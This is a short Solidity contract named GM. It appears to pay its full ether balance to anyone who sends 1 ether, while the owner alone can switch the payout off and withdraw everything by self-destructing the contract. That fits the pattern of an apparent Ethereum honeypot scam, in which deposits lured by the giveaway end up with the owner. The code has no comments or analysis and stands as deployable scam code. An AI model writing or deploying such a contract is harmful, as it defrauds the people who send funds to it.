1 pragma solidity ^0.4.25;
2 
3 contract GM {
4     function() public payable {}
5     address Owner; bool closed = false;
6     function set() public payable {
7         if (0==Owner) Owner=msg.sender;
8     }
9     function close(bool F) public {
10         if (msg.sender==Owner) closed=F;
11     }
12     function end() public {
13             if (msg.sender==Owner) selfdestruct(msg.sender);
14     }
15     function get() public payable {
16         if (msg.value>=1 ether && !closed) {
17             msg.sender.transfer(address(this).balance);
18         }
19     }
20 }